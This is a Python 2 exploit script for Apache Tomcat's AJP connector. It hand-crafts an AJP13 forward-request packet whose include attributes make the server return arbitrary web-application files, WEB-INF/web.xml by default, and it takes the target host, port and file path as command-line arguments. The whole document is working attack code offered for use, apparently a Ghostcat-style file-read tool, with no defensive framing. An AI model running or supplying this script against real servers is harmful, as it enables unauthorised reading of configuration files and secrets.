#coding:utf-8
#@20200221
#@hf.liu

import sys
import struct
import socket
socket.setdefaulttimeout(2)




def str_packet(st):
	length = len(st)
	if length>0:
		sp = struct.pack('%ds'%(length+1), st)
		line = struct.pack('!h', length) + sp
	else:
		line = struct.pack('BB', 0xff, 0xff)
	#print line
	return line

def header_attr_append(headers):
	line = ''
	for k,v in headers.iteritems():
		line = line + k+v
	return line

def exploit(host, port, file="WEB-INF/web.xml"):
	host = host
	port = port

	s = socket.socket()
	s.connect((host,port))
	localhost,localport = s.getsockname()

	start = struct.pack('BB',0x12,0x34)
	length = struct.pack('!h',1)

	method = {'OPTIONS':1, 'GET':2, 'HEAD':3, 'POST':4, 'PUT':5, 'DELETE':6, 'TRACE':7}
	protocol = 'HTTP/1.1'
	req_uri = '/test.jsp'
	remote_addr = localhost
	remote_host = ''
	server_name = host
	server_port = 80
	is_ssl = False

	#struct.pack('!BB', 0xa0,0x0b)
	headers = {str_packet('Host'):str_packet(host), str_packet('Accept-Encoding'):str_packet('identity'), \
		str_packet('Cookie'):str_packet('a=b')}

	num_headers = len(headers)
	attributes = [
		struct.pack('!B', 0x0a) + str_packet('javax.servlet.include.request_uri')+str_packet('/'),\
		struct.pack('!B', 0x0a) + str_packet('javax.servlet.include.path_info') + str_packet('%s'%file),\
		struct.pack('!B', 0x0a) + str_packet('javax.servlet.include.servlet_path') + str_packet('/')
		]


	ajp13_forward_request = {
	    'prefix_code': struct.pack('b',0x02),
	    'method': struct.pack('b', method['GET']),
	    'protocol': str_packet(protocol),
	    'req_uri': str_packet(req_uri),
	    'remote_addr': str_packet(remote_addr),
	    'remote_host': str_packet(remote_host),
	    'server_name': str_packet(server_name),
	    'server_port': struct.pack('!h', server_port),
	    'is_ssl': struct.pack('!?', is_ssl),#           (boolean)
	    'num_headers': struct.pack('!h', num_headers), #     (integer)
	    'request_headers': headers,
	    'attributes': attributes,
		'request_terminator': struct.pack('B', 0xff)
	}

	data = ajp13_forward_request['prefix_code'] + ajp13_forward_request['method'] + \
		ajp13_forward_request['protocol'] + ajp13_forward_request['req_uri'] + ajp13_forward_request['remote_addr'] + \
		ajp13_forward_request['remote_host'] + ajp13_forward_request['server_name'] + ajp13_forward_request['server_port'] + \
		ajp13_forward_request['is_ssl'] + ajp13_forward_request['num_headers'] + header_attr_append(ajp13_forward_request['request_headers'])+\
		''.join(ajp13_forward_request['attributes']) + ajp13_forward_request['request_terminator']



	length = struct.pack('!h', len(data))
	packet_data = start+ length +data
	s.send(packet_data)
	endbyte = struct.pack('>5B', 0x41,0x42,0x00,0x02,0x05)
	resp = ''
	while True:
		buf = s.recv(1024)
		resp = resp + buf
		if endbyte in resp:
			break
	print resp

def usage():
	print '''python tomcatfileread.py 192.168.0.1 8009 WEB-INF/web.xml''' #10.104.0.81

def test():
	exploit('10.10.0.81', 8009)

if __name__ == '__main__':
	if len(sys.argv) != 4:
		usage()
		exit(0)
	host = str(sys.argv[1]).strip()
	port = int(str(sys.argv[2].strip()))
	file = sys.argv[3].strip()
	exploit(host, port, file)
